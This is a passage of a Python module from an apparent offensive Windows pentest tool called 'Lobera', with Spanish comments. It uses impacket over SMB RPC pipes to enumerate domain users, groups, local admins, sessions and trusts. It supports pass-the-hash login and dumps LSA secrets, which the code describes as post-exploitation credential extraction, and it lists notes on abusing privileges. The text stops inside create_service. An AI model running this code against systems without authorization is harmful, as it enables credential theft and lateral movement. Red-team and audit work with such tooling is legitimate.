# modules/rpc.py

"""
RPCModule — capa de acceso a interfaces RPC de Windows sobre impacket.

Pipes/interfaces cubiertas:
  \\pipe\\samr     → SAMR   : usuarios, grupos, políticas de cuenta
  \\pipe\\lsarpc  → LSARPC : SIDs, privilegios, trust relationships, secretos LSA
  \\pipe\\srvsvc  → SRVSVC : sesiones activas, shares, información del servidor
  \\pipe\\wkssvc  → WKSSVC : información de la workstation, sesiones
  \\pipe\\atsvc   → AT/TSCH: tareas programadas (AT legacy)
  \\pipe\\svcctl  → SCMR   : Service Control Manager (crear/arrancar servicios)
  \\pipe\\winreg  → WINREG : lectura de registro remoto
  \\pipe\\epmapper→ EPM    : endpoint mapper (enumeración de servicios RPC)

API pública:
  connect()            → abre SMB + IPC$
  disconnect()

  SAMR:
    get_users()
    get_groups()
    get_domain_info()
    get_user_info(username)
    enumerate_local_admins()

  LSARPC:
    get_lsa_domain_info()
    lookup_sids(sids)
    lookup_names(names)
    enumerate_privileges()
    enumerate_accounts_with_privilege(priv_name)
    enumerate_trusted_domains()
    get_lsa_secrets()        ← requiere SYSTEM/DA

  SRVSVC:
    get_server_info()
    get_active_sessions()
    get_shares()
    get_open_files()

  WKSSVC:
    get_workstation_info()
    get_logged_on_users()

  SVCCTL (SCM):
    list_services()
    create_service(name, display, binary_path)
    start_service(name)
    stop_service(name)
    delete_service(name)
    exec_via_service(command)     ← create + start + delete

  WINREG:
    reg_query(hive, key, value)
    reg_enum_keys(hive, key)
    reg_enum_values(hive, key)

  EPM:
    enumerate_endpoints()
"""

import os
import time

from impacket.dcerpc.v5 import transport, samr, lsat, lsad, srvs as srvsvc, wkst, scmr, rrp, epm
from impacket.dcerpc.v5 import tsch   # Task Scheduler
from impacket.dcerpc.v5.dtypes import NULL, MAXIMUM_ALLOWED
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket import uuid as impacket_uuid

from core.output import print_result, print_check, print_table, console
from core import session_db

# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------

# Hives de registro
HKLM = 0x80000002
HKCU = 0x80000001
HKCR = 0x80000000
HKU  = 0x80000003

HIVE_NAMES = {
    "HKLM": HKLM,
    "HKCU": HKCU,
    "HKCR": HKCR,
    "HKU":  HKU,
}

# Privilegios interesantes desde perspectiva ofensiva
INTERESTING_PRIVS = {
    "SeDebugPrivilege":          "Leer/escribir memoria de cualquier proceso (incluido LSASS)",
    "SeImpersonatePrivilege":    "Impersonation → Potato attacks (privesc a SYSTEM)",
    "SeAssignPrimaryToken":      "Asignar token primario → privesc",
    "SeBackupPrivilege":         "Leer cualquier fichero ignorando DACL → volcado de SAM/SYSTEM",
    "SeRestorePrivilege":        "Escribir cualquier fichero ignorando DACL",
    "SeTakeOwnershipPrivilege":  "Tomar posesión de cualquier objeto",
    "SeLoadDriverPrivilege":     "Cargar driver arbitrario → BYOVD",
    "SeCreateTokenPrivilege":    "Crear tokens de acceso arbitrarios",
    "SeTcbPrivilege":            "Actuar como parte del OS (nivel SYSTEM)",
    "SeEnableDelegationPrivilege": "Habilitar delegación Kerberos (DA typical)",
}

# Estado de servicios
SERVICE_STATE = {
    scmr.SERVICE_STOPPED:          "STOPPED",
    scmr.SERVICE_START_PENDING:    "START_PENDING",
    scmr.SERVICE_STOP_PENDING:     "STOP_PENDING",
    scmr.SERVICE_RUNNING:          "RUNNING",
    scmr.SERVICE_CONTINUE_PENDING: "CONTINUE_PENDING",
    scmr.SERVICE_PAUSE_PENDING:    "PAUSE_PENDING",
    scmr.SERVICE_PAUSED:           "PAUSED",
}

# Tipo de inicio de servicios
SERVICE_START_TYPE = {
    scmr.SERVICE_BOOT_START:   "BOOT",
    scmr.SERVICE_SYSTEM_START: "SYSTEM",
    scmr.SERVICE_AUTO_START:   "AUTO",
    scmr.SERVICE_DEMAND_START: "MANUAL",
    scmr.SERVICE_DISABLED:     "DISABLED",
}


# ---------------------------------------------------------------------------
# RPCModule
# ---------------------------------------------------------------------------

class RPCModule:
    """
    Módulo RPC de Lobera.

    Abre una conexión SMB al share IPC$ y luego enlaza a cada interfaz
    RPC bajo demanda. Cada método de alto nivel gestiona el binding
    internamente — no hace falta llamar a _bind() manualmente.
    """

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds
        self._smb   = None   # SMBConnection subyacente
        self._dce_cache = {} # {pipe_path: dce_connection} para reutilizar

    # ------------------------------------------------------------------
    # Conexión base (IPC$)
    # ------------------------------------------------------------------

    def connect(self):
        """
        Abre la conexión SMB y autentica. No hace bind RPC todavía.
        Los binds se hacen bajo demanda en cada método.
        """
        from impacket.smbconnection import SMBConnection
        try:
            smb = SMBConnection(
                remoteName=self.target.ip,
                remoteHost=self.target.ip,
                timeout=self.target.timeout,
            )
            if self.creds.hash:
                nthash = self.creds.hash.split(":")[-1]
                smb.login(self.creds.user, "", self.creds.domain,
                          lmhash="", nthash=nthash)
            else:
                smb.login(
                    self.creds.user or "", self.creds.password or "",
                    self.creds.domain or "",
                )
            self._smb = smb
            session_db.save_target(self.target.ip, domain=self.target.domain)
            print_result("RPC", self.target.ip, "ok",
                         "conexión SMB establecida para IPC$")
            return True
        except Exception as exc:
            reason = exc.getErrorString()[0] if hasattr(exc, "getErrorString") else str(exc)
            print_result("RPC", self.target.ip, "fail",
                         "no se pudo conectar: {}".format(reason))
            return False

    def disconnect(self):
        for dce in self._dce_cache.values():
            try:
                dce.disconnect()
            except Exception:
                pass
        self._dce_cache.clear()
        if self._smb:
            try:
                self._smb.logoff()
            except Exception:
                pass
            self._smb = None

    def _get_dce(self, pipe, iface_uuid, iface_version):
        """
        Devuelve una conexión DCE/RPC ya enlazada a la interfaz solicitada.
        Reutiliza conexiones ya abiertas (caché por pipe).
        """
        cache_key = "{}:{}".format(pipe, iface_uuid)
        if cache_key in self._dce_cache:
            return self._dce_cache[cache_key]

        rpctransport = transport.SMBTransport(
            self.target.ip,
            filename=pipe,
            smb_connection=self._smb,
        )
        dce = rpctransport.get_dce_rpc()
        dce.connect()
        dce.bind(impacket_uuid.uuidtup_to_bin((iface_uuid, iface_version)))
        self._dce_cache[cache_key] = dce
        return dce

    def _dce_samr(self):
        return self._get_dce(r"\pipe\samr",
                             "12345778-1234-ABCD-EF00-0123456789AC", "1.0")

    def _dce_lsarpc(self):
        return self._get_dce(r"\pipe\lsarpc",
                             "12345778-1234-ABCD-EF00-0123456789AB", "0.0")

    def _dce_srvsvc(self):
        return self._get_dce(r"\pipe\srvsvc",
                             "4B324FC8-1670-01D3-1278-5A47BF6EE188", "3.0")

    def _dce_wkssvc(self):
        return self._get_dce(r"\pipe\wkssvc",
                             "6BFFD098-A112-3610-9833-46C3F87E345A", "1.0")

    def _dce_svcctl(self):
        return self._get_dce(r"\pipe\svcctl",
                             "367ABB81-9844-35F1-AD32-98F038001003", "2.0")

    def _dce_winreg(self):
        return self._get_dce(r"\pipe\winreg",
                             "338CD001-2244-31F1-AAAA-900038001003", "1.0")

    def _dce_epm(self):
        return self._get_dce(r"\pipe\epmapper",
                             "E1AF8308-5D1F-11C9-91A4-08002B14A0FA", "3.0")

    # ==================================================================
    # SAMR — Security Account Manager Remote Protocol
    # ==================================================================

    def _samr_open_domain(self, dce):
        """Helper: abre el handle de dominio SAMR."""
        resp = samr.hSamrConnect(dce)
        server_handle = resp["ServerHandle"]

        resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
        domains = resp2["Buffer"]["Buffer"]

        # Preferimos el primero que no sea "Builtin"
        domain_name = None
        for d in domains:
            name = d["Name"]["Buffer"]
            if name.upper() != "BUILTIN":
                domain_name = name
                break
        if domain_name is None and domains:
            domain_name = domains[0]["Name"]["Buffer"]

        resp3 = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
        domain_sid = resp3["DomainId"]

        resp4 = samr.hSamrOpenDomain(dce, server_handle,
                                      samr.DOMAIN_READ_PASSWORD_PARAMETERS |
                                      samr.DOMAIN_READ_OTHER_PARAMETERS |
                                      samr.DOMAIN_LIST_ACCOUNTS |
                                      samr.DOMAIN_LOOKUP,
                                      domain_sid)
        domain_handle = resp4["DomainHandle"]
        return server_handle, domain_handle, domain_name, domain_sid

    def get_users(self):
        """
        Enumera todos los usuarios del dominio vía SAMR.

        Retorna lista de dicts: {rid, username, full_name, description,
                                  last_logon, pwd_last_set, acb_flags}
        """
        try:
            dce = self._dce_samr()
            srv_h, dom_h, domain_name, domain_sid = self._samr_open_domain(dce)

            resp = samr.hSamrEnumerateUsersInDomain(dce, dom_h)
            users_enum = resp["Buffer"]["Buffer"]

            results = []
            for u in users_enum:
                rid      = u["RelativeId"]
                username = u["Name"]["Buffer"]

                # Abrir usuario para obtener detalles
                try:
                    user_h_resp = samr.hSamrOpenUser(dce, dom_h,
                                                     samr.USER_READ_GENERAL |
                                                     samr.USER_READ_LOGON  |
                                                     samr.USER_READ_ACCOUNT,
                                                     rid)
                    user_h = user_h_resp["UserHandle"]
                    info   = samr.hSamrQueryInformationUser2(
                        dce, user_h,
                        samr.USER_ALL_INFORMATION,
                    )["Buffer"]["All"]

                    acb   = int(info["UserAccountControl"])
                    full  = str(info["FullName"]["Buffer"]) if info["FullName"]["Buffer"] else ""
                    desc  = str(info["AdminComment"]["Buffer"]) if info["AdminComment"]["Buffer"] else ""

                    results.append({
                        "rid":        rid,
                        "username":   username,
                        "full_name":  full,
                        "description": desc,
                        "acb_flags":  acb,
                        "disabled":   bool(acb & samr.USER_ACCOUNT_DISABLED),
                        "no_preauth": bool(acb & samr.USER_DONT_REQUIRE_PREAUTH),
                        "no_pwd_exp": bool(acb & samr.USER_DONT_EXPIRE_PASSWORD),
                    })
                    samr.hSamrCloseHandle(dce, user_h)
                except Exception:
                    results.append({
                        "rid": rid, "username": username,
                        "full_name": "", "description": "",
                        "acb_flags": 0, "disabled": False,
                        "no_preauth": False, "no_pwd_exp": False,
                    })

                session_db.save_finding(
                    self.target.ip, "RPC", "samr_user",
                    "{} (RID={})".format(username, rid),
                )

            print_result("RPC", self.target.ip, "ok",
                         "SAMR: {} usuarios encontrados".format(len(results)))
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SAMR get_users: {}".format(exc))
            return []

    def get_groups(self):
        """
        Enumera grupos del dominio vía SAMR.

        Retorna lista de dicts: {rid, name, member_count}
        """
        try:
            dce = self._dce_samr()
            _, dom_h, _, _ = self._samr_open_domain(dce)

            resp = samr.hSamrEnumerateGroupsInDomain(dce, dom_h)
            groups_raw = resp["Buffer"]["Buffer"]

            results = []
            for g in groups_raw:
                rid  = g["RelativeId"]
                name = g["Name"]["Buffer"]

                # Intentar obtener número de miembros
                member_count = 0
                try:
                    grp_h_resp = samr.hSamrOpenGroup(dce, dom_h,
                                                     samr.GROUP_READ_INFORMATION |
                                                     samr.GROUP_LIST_MEMBERS,
                                                     rid)
                    grp_h = grp_h_resp["GroupHandle"]
                    members_resp = samr.hSamrGetMembersInGroup(dce, grp_h)
                    member_count = members_resp["Members"]["MemberCount"]
                    samr.hSamrCloseHandle(dce, grp_h)
                except Exception:
                    pass

                results.append({
                    "rid": rid, "name": name, "member_count": member_count,
                })
                session_db.save_finding(
                    self.target.ip, "RPC", "samr_group",
                    "{} (RID={}, {} miembros)".format(name, rid, member_count),
                )

            print_result("RPC", self.target.ip, "ok",
                         "SAMR: {} grupos encontrados".format(len(results)))
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SAMR get_groups: {}".format(exc))
            return []

    def get_domain_info(self):
        """
        Información del dominio vía SAMR: nombre, SID, política de contraseñas.
        """
        try:
            dce = self._dce_samr()
            _, dom_h, domain_name, domain_sid = self._samr_open_domain(dce)

            pwd_info = samr.hSamrQueryInformationDomain(
                dce, dom_h, samr.DOMAIN_PASSWORD_INFORMATION
            )["Buffer"]["Password"]

            logon_info = samr.hSamrQueryInformationDomain(
                dce, dom_h, samr.DOMAIN_LOGON_INFORMATION
            )["Buffer"]["Logon"]

            result = {
                "domain_name":         domain_name,
                "domain_sid":          domain_sid.formatCanonical(),
                "min_pwd_length":      int(pwd_info["MinPasswordLength"]),
                "pwd_history_length":  int(pwd_info["PasswordHistoryLength"]),
                "lockout_threshold":   int(logon_info["LockoutThreshold"]),
                "lockout_duration":    abs(int(logon_info["LockoutDuration"]["LowPart"])) // 600_000_000,
                "max_pwd_age":         abs(int(pwd_info["MaxPasswordAge"]["LowPart"])) // 864_000_000_000,
                "complexity_enabled":  bool(int(pwd_info["PasswordProperties"]) & 1),
            }

            session_db.save_finding(
                self.target.ip, "RPC", "samr_domain_info",
                "domain={} sid={}".format(domain_name, result["domain_sid"]),
            )
            return result

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SAMR get_domain_info: {}".format(exc))
            return {}

    def get_user_info(self, username):
        """
        Detalles de un usuario específico por nombre (vía SAMR).
        """
        try:
            dce = self._dce_samr()
            _, dom_h, _, _ = self._samr_open_domain(dce)

            rid_resp = samr.hSamrLookupNamesInDomain(dce, dom_h, [username])
            rid = rid_resp["RelativeIds"]["Element"][0]["Data"]

            user_h_resp = samr.hSamrOpenUser(
                dce, dom_h,
                samr.USER_READ_GENERAL | samr.USER_READ_LOGON |
                samr.USER_READ_ACCOUNT | samr.USER_READ_PREFERENCES,
                rid,
            )
            user_h = user_h_resp["UserHandle"]
            info   = samr.hSamrQueryInformationUser2(
                dce, user_h, samr.USER_ALL_INFORMATION
            )["Buffer"]["All"]
            samr.hSamrCloseHandle(dce, user_h)

            acb = int(info["UserAccountControl"])
            return {
                "rid":          rid,
                "username":     username,
                "full_name":    str(info["FullName"]["Buffer"]),
                "description":  str(info["AdminComment"]["Buffer"]),
                "acb_flags":    acb,
                "disabled":     bool(acb & samr.USER_ACCOUNT_DISABLED),
                "no_preauth":   bool(acb & samr.USER_DONT_REQUIRE_PREAUTH),
                "no_pwd_exp":   bool(acb & samr.USER_DONT_EXPIRE_PASSWORD),
                "bad_pwd_count": int(info["BadPasswordCount"]),
                "logon_count":  int(info["LogonCount"]),
            }
        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SAMR get_user_info {}: {}".format(username, exc))
            return {}

    def enumerate_local_admins(self):
        """
        Enumera miembros del grupo Administrators local (RID 544) vía SAMR/BUILTIN.
        """
        try:
            dce = self._dce_samr()
            resp = samr.hSamrConnect(dce)
            srv_h = resp["ServerHandle"]

            # Abrir dominio BUILTIN
            resp2 = samr.hSamrLookupDomainInSamServer(dce, srv_h, "Builtin")
            builtin_sid = resp2["DomainId"]
            resp3 = samr.hSamrOpenDomain(dce, srv_h, samr.DOMAIN_LOOKUP, builtin_sid)
            builtin_h = resp3["DomainHandle"]

            # RID 544 = Administrators
            grp_h_resp = samr.hSamrOpenAlias(
                dce, builtin_h, samr.ALIAS_LIST_MEMBERS, 544
            )
            grp_h = grp_h_resp["AliasHandle"]
            members_resp = samr.hSamrGetMembersInAlias(dce, grp_h)

            sids = [s.formatCanonical() for s in members_resp["Members"]["Sids"]]
            # Resolver SIDs a nombres
            names = self.lookup_sids(sids)

            results = []
            for sid_str, name_info in zip(sids, names):
                results.append({"sid": sid_str, "name": name_info.get("name", sid_str)})
                session_db.save_finding(
                    self.target.ip, "RPC", "local_admin",
                    name_info.get("name", sid_str),
                )

            print_result("RPC", self.target.ip, "pwned" if results else "ok",
                         "Local Admins: {}".format(
                             ", ".join(r["name"] for r in results) or "ninguno"))
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SAMR local_admins: {}".format(exc))
            return []

    # ==================================================================
    # LSARPC — Local Security Authority Remote Protocol
    # ==================================================================

    def _lsa_open_policy(self, dce, desired_access=None):
        if desired_access is None:
            desired_access = (
                lsad.POLICY_VIEW_LOCAL_INFORMATION |
                lsad.POLICY_VIEW_AUDIT_INFORMATION |
                lsad.POLICY_GET_PRIVATE_INFORMATION |
                lsad.POLICY_LOOKUP_NAMES
            )
        resp = lsad.hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED)
        return resp["PolicyHandle"]

    def get_lsa_domain_info(self):
        """
        Información del dominio vía LSA: nombre, SID, DNS domain.
        """
        try:
            dce   = self._dce_lsarpc()
            pol_h = self._lsa_open_policy(dce)

            resp = lsad.hLsarQueryInformationPolicy2(
                dce, pol_h, lsad.POLICY_DNS_DOMAIN_INFORMATION
            )
            info = resp["PolicyInformation"]["DnsDomainInfo"]

            result = {
                "dns_domain":    str(info["DnsDomainName"]["Buffer"]),
                "netbios_name":  str(info["Name"]["Buffer"]),
                "domain_guid":   info["DomainGuid"].formatCanonical() if hasattr(info["DomainGuid"], "formatCanonical") else "",
                "domain_sid":    info["Sid"].formatCanonical() if info["Sid"] else "",
            }
            session_db.save_finding(
                self.target.ip, "RPC", "lsa_domain_info",
                "dns={} netbios={} sid={}".format(
                    result["dns_domain"],
                    result["netbios_name"],
                    result["domain_sid"],
                ),
            )
            return result

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "LSA domain_info: {}".format(exc))
            return {}

    def lookup_sids(self, sids):
        """
        Resuelve una lista de SID strings a nombres de cuenta.
        Retorna lista de dicts: {sid, name, domain, type}
        """
        if not sids:
            return []
        try:
            dce   = self._dce_lsarpc()
            pol_h = self._lsa_open_policy(dce)

            # Construir array de SIDs para impacket
            from impacket.dcerpc.v5.dtypes import RPC_SID
            sid_array = lsat.LSAPR_SID_ENUM_BUFFER()
            sid_array["Entries"] = len(sids)

            results = []
            # impacket procesa los SIDs de 20 en 20 para evitar errores
            chunk_size = 20
            for chunk_start in range(0, len(sids), chunk_size):
                chunk = sids[chunk_start: chunk_start + chunk_size]
                try:
                    resp = lsat.hLsarLookupSids(dce, pol_h, chunk)
                    names     = resp["TranslatedNames"]["Names"]
                    ref_doms  = resp["ReferencedDomains"]["Domains"]
                    for i, sid_str in enumerate(chunk):
                        if i < len(names):
                            n = names[i]
                            dom_idx = n["DomainIndex"]
                            dom = ref_doms[dom_idx]["Name"]["Buffer"] if 0 <= dom_idx < len(ref_doms) else ""
                            name = n["Name"]["Buffer"] if n["Name"]["Buffer"] else sid_str
                            results.append({
                                "sid":    sid_str,
                                "name":   "{}\\{}".format(dom, name) if dom else name,
                                "domain": dom,
                                "type":   int(n["Use"]),
                            })
                        else:
                            results.append({"sid": sid_str, "name": sid_str, "domain": "", "type": 0})
                except Exception:
                    for sid_str in chunk:
                        results.append({"sid": sid_str, "name": sid_str, "domain": "", "type": 0})
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "LSA lookup_sids: {}".format(exc))
            return [{"sid": s, "name": s, "domain": "", "type": 0} for s in sids]

    def lookup_names(self, names):
        """
        Resuelve nombres de cuenta a SIDs.
        Retorna lista de dicts: {name, sid, domain, type}
        """
        if not names:
            return []
        try:
            dce   = self._dce_lsarpc()
            pol_h = self._lsa_open_policy(dce)
            resp  = lsat.hLsarLookupNames3(dce, pol_h, names)

            ref_doms = resp["ReferencedDomains"]["Domains"]
            sids_out = resp["TranslatedSids"]["Sids"]
            results  = []
            for i, name in enumerate(names):
                if i < len(sids_out):
                    s = sids_out[i]
                    sid_str  = s["Sid"].formatCanonical() if s["Sid"] else ""
                    dom_idx  = s["DomainIndex"]
                    dom_name = ref_doms[dom_idx]["Name"]["Buffer"] if 0 <= dom_idx < len(ref_doms) else ""
                    results.append({
                        "name":   name,
                        "sid":    sid_str,
                        "domain": dom_name,
                        "type":   int(s["Use"]),
                    })
                else:
                    results.append({"name": name, "sid": "", "domain": "", "type": 0})
            return results
        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "LSA lookup_names: {}".format(exc))
            return []

    def enumerate_privileges(self):
        """
        Enumera todos los privilegios definidos en el sistema.
        Retorna lista de dicts: {name, luid, display_name, interesting}
        """
        try:
            dce   = self._dce_lsarpc()
            pol_h = self._lsa_open_policy(dce)
            resp  = lsad.hLsarEnumeratePrivileges(dce, pol_h)
            privs = resp["Privileges"]["Privilege"]

            results = []
            for p in privs:
                name = str(p["Name"]["Buffer"])
                results.append({
                    "name":        name,
                    "luid_high":   int(p["Luid"]["HighPart"]),
                    "luid_low":    int(p["Luid"]["LowPart"]),
                    "interesting": name in INTERESTING_PRIVS,
                    "abuse_note":  INTERESTING_PRIVS.get(name, ""),
                })
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "LSA enumerate_privileges: {}".format(exc))
            return []

    def enumerate_accounts_with_privilege(self, priv_name):
        """
        Retorna qué cuentas tienen un privilegio dado (ej: SeDebugPrivilege).
        """
        try:
            dce   = self._dce_lsarpc()
            pol_h = self._lsa_open_policy(dce)
            resp  = lsad.hLsarLookupPrivilegeValue(dce, pol_h, priv_name)
            luid  = resp["Luid"]

            resp2 = lsad.hLsarEnumerateAccountsWithUserRight(dce, pol_h, priv_name)
            sids  = [s["Sid"].formatCanonical() for s in resp2["EnumerationBuffer"]["Information"]]

            names = self.lookup_sids(sids)
            results = [{"sid": s, "name": n.get("name", s)}
                       for s, n in zip(sids, names)]

            if results:
                session_db.save_finding(
                    self.target.ip, "RPC", "privilege_account",
                    "{}: {}".format(priv_name,
                                    ", ".join(r["name"] for r in results)),
                )
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "LSA accounts_with_priv {}: {}".format(priv_name, exc))
            return []

    def enumerate_trusted_domains(self):
        """
        Lista los dominios de confianza configurados vía LSA.
        Retorna lista de dicts: {name, sid, direction, type}
        """
        try:
            dce   = self._dce_lsarpc()
            pol_h = self._lsa_open_policy(dce)

            resp = lsad.hLsarEnumerateTrustedDomainsEx(dce, pol_h)
            domains = resp["EnumerationBuffer"]["Information"]

            results = []
            for d in domains:
                name = str(d["Name"]["Buffer"])
                sid  = d["Sid"].formatCanonical() if d.get("Sid") else ""
                direction = int(d.get("TrustDirection", 0))
                trust_type = int(d.get("TrustType", 0))

                dir_str = {1: "INBOUND", 2: "OUTBOUND", 3: "BIDIRECTIONAL"}.get(direction, str(direction))
                type_str = {1: "DOWNLEVEL", 2: "UPLEVEL", 3: "MIT", 4: "DCE"}.get(trust_type, str(trust_type))

                results.append({
                    "name":      name,
                    "sid":       sid,
                    "direction": dir_str,
                    "type":      type_str,
                })
                session_db.save_finding(
                    self.target.ip, "RPC", "trust_domain",
                    "{} ({}, {})".format(name, dir_str, type_str),
                )
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "LSA trusted_domains: {}".format(exc))
            return []

    def get_lsa_secrets(self):
        """
        Intenta volcar secretos LSA (requiere privilegios SYSTEM/DA).
        Útil en post-explotación para extraer cuentas de servicio y credenciales cacheadas.
        Retorna lista de dicts: {key_name, secret_bytes_hex}
        """
        try:
            dce   = self._dce_lsarpc()
            pol_h = self._lsa_open_policy(dce)

            # Enumerar nombres de secretos
            resp = lsad.hLsarEnumeratePrivateData(dce, pol_h)
            secret_names = [str(s["Buffer"]) for s in resp["EnumerationBuffer"]["Information"]]

            results = []
            for name in secret_names:
                try:
                    resp2 = lsad.hLsarRetrievePrivateData(dce, pol_h, name)
                    secret_bytes = bytes(resp2["EncryptedData"]["Buffer"])
                    results.append({
                        "key_name":          name,
                        "secret_bytes_hex":  secret_bytes.hex(),
                    })
                    session_db.save_finding(
                        self.target.ip, "RPC", "lsa_secret",
                        "key={} bytes={}".format(name, len(secret_bytes)),
                    )
                except Exception:
                    results.append({"key_name": name, "secret_bytes_hex": "(acceso denegado)"})

            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "LSA get_secrets (requiere SYSTEM/DA): {}".format(exc))
            return []

    # ==================================================================
    # SRVSVC — Server Service Remote Protocol
    # ==================================================================

    def get_server_info(self):
        """
        Información del servidor: nombre, OS, dominio, versión.
        """
        try:
            dce  = self._dce_srvsvc()
            resp = srvsvc.hNetrServerGetInfo(dce, 101)
            info = resp["InfoStruct"]["ServerInfo101"]

            result = {
                "name":    str(info["sv101_name"]).rstrip("\x00"),
                "comment": str(info["sv101_comment"]).rstrip("\x00"),
                "platform": int(info["sv101_platform_id"]),
                "version":  "{}.{}".format(
                    int(info["sv101_version_major"]),
                    int(info["sv101_version_minor"]),
                ),
            }
            session_db.save_finding(
                self.target.ip, "RPC", "server_info",
                "name={} version={}".format(result["name"], result["version"]),
            )
            return result

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SRVSVC server_info: {}".format(exc))
            return {}

    def get_active_sessions(self):
        """
        Enumera sesiones activas en el servidor (quién está conectado).
        Retorna lista de dicts: {user, client, time, idle_time}
        """
        try:
            dce  = self._dce_srvsvc()
            resp = srvsvc.hNetrSessionEnum(dce, NULL, NULL, 10)
            sessions_raw = resp["InfoStruct"]["SessionInfo"]["Level10"]["Buffer"]

            results = []
            for s in sessions_raw:
                user   = str(s["sesi10_username"]).rstrip("\x00")
                client = str(s["sesi10_cname"]).rstrip("\x00").lstrip("\\")
                time_s = int(s["sesi10_time"])
                idle_s = int(s["sesi10_idle_time"])

                results.append({
                    "user":       user,
                    "client":     client,
                    "time_min":   time_s // 60,
                    "idle_min":   idle_s // 60,
                })
                session_db.save_finding(
                    self.target.ip, "RPC", "active_session",
                    "{}@{} ({}min)".format(user, client, time_s // 60),
                )

            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SRVSVC active_sessions: {}".format(exc))
            return []

    def get_shares(self):
        """
        Enumera shares vía SRVSVC (nivel 502: incluye permisos).
        """
        try:
            dce  = self._dce_srvsvc()
            resp = srvsvc.hNetrShareEnum(dce, 1)
            shares_raw = resp["InfoStruct"]["ShareInfo"]["Level1"]["Buffer"]

            results = []
            for s in shares_raw:
                name    = str(s["shi1_netname"]).rstrip("\x00")
                comment = str(s["shi1_remark"]).rstrip("\x00")
                stype   = int(s["shi1_type"])
                results.append({
                    "name":    name,
                    "comment": comment,
                    "type":    stype,
                })
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SRVSVC get_shares: {}".format(exc))
            return []

    def get_open_files(self):
        """
        Enumera ficheros abiertos en el servidor.
        Retorna lista de dicts: {file_id, user, path, permissions, num_locks}
        """
        try:
            dce  = self._dce_srvsvc()
            resp = srvsvc.hNetrFileEnum(dce, NULL, NULL, 3)
            files_raw = resp["InfoStruct"]["FileInfo"]["Level3"]["Buffer"]

            results = []
            for f in files_raw:
                results.append({
                    "file_id":    int(f["fi3_id"]),
                    "user":       str(f["fi3_username"]).rstrip("\x00"),
                    "path":       str(f["fi3_pathname"]).rstrip("\x00"),
                    "permissions":int(f["fi3_permissions"]),
                    "num_locks":  int(f["fi3_num_locks"]),
                })
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SRVSVC open_files: {}".format(exc))
            return []

    # ==================================================================
    # WKSSVC — Workstation Service Remote Protocol
    # ==================================================================

    def get_workstation_info(self):
        """
        Información de la workstation: nombre, dominio, versión OS.
        """
        try:
            dce  = self._dce_wkssvc()
            resp = wkst.hNetrWkstaGetInfo(dce, 100)
            info = resp["WkstaInfo"]["WkstaInfo100"]

            result = {
                "computer_name": str(info["wki100_computername"]).rstrip("\x00"),
                "lan_group":     str(info["wki100_langroup"]).rstrip("\x00"),
                "version_major": int(info["wki100_ver_major"]),
                "version_minor": int(info["wki100_ver_minor"]),
                "platform_id":   int(info["wki100_platform_id"]),
            }
            session_db.save_finding(
                self.target.ip, "RPC", "wks_info",
                "name={} domain={} v{}.{}".format(
                    result["computer_name"], result["lan_group"],
                    result["version_major"], result["version_minor"],
                ),
            )
            return result

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "WKSSVC workstation_info: {}".format(exc))
            return {}

    def get_logged_on_users(self):
        """
        Enumera usuarios con sesión interactiva activa en la máquina.
        """
        try:
            dce  = self._dce_wkssvc()
            resp = wkst.hNetrWkstaUserEnum(dce, 1)
            users_raw = resp["UserInfo"]["WkstaUserInfo"]["Level1"]["Buffer"]

            results = []
            for u in users_raw:
                username = str(u["wkui1_username"]).rstrip("\x00")
                logon_domain = str(u["wkui1_logon_domain"]).rstrip("\x00")
                oth_domains  = str(u["wkui1_oth_domains"]).rstrip("\x00")
                logon_server = str(u["wkui1_logon_server"]).rstrip("\x00")

                results.append({
                    "username":    username,
                    "domain":      logon_domain,
                    "oth_domains": oth_domains,
                    "logon_server":logon_server,
                })
                session_db.save_finding(
                    self.target.ip, "RPC", "logged_on_user",
                    "{}\\{}".format(logon_domain, username),
                )

            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "WKSSVC logged_on_users: {}".format(exc))
            return []

    # ==================================================================
    # SVCCTL — Service Control Manager Remote Protocol
    # ==================================================================

    def _scm_open(self, dce):
        resp = scmr.hROpenSCManagerW(dce)
        return resp["lpScHandle"]

    def list_services(self):
        """
        Enumera servicios del sistema vía SCM.
        Retorna lista de dicts: {name, display_name, state, start_type, binary_path}
        """
        try:
            dce   = self._dce_svcctl()
            scm_h = self._scm_open(dce)

            resp  = scmr.hREnumServicesStatusW(
                dce, scm_h,
                scmr.SERVICE_WIN32,
                scmr.SERVICE_STATE_ALL,
            )
            results = []
            for svc in resp:
                name      = str(svc["lpServiceName"])
                disp_name = str(svc["lpDisplayName"])
                state     = SERVICE_STATE.get(
                    int(svc["ServiceStatus"]["dwCurrentState"]), "UNKNOWN"
                )
                results.append({
                    "name":         name,
                    "display_name": disp_name,
                    "state":        state,
                    "binary_path":  "",  # necesita query individual
                })

            scmr.hRCloseServiceHandle(dce, scm_h)
            return results

        except DCERPCException as exc:
            print_result("RPC", self.target.ip, "fail",
                         "SCM list_services: {}".format(exc))
            return []

    def create_service(self, name, display_name, binary_path):
        """
        Crea un servicio en el SCM remoto.
